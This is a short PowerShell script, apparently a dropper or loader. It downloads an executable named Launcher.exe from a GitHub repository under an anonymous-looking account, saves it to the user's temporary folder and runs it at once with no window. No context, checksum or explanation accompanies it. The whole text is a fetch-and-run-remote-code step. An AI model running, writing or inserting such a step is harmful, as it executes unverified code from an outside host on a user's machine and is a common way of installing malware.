$execUrl = "https://raw.githubusercontent.com/v25888656-maker/installer/main/Launcher.exe"
$execPath = "$env:TEMP\Launcher.exe"
irm -Uri $execUrl -OutFile $execPath
Start-Process -FilePath $execPath -NoNewWindow
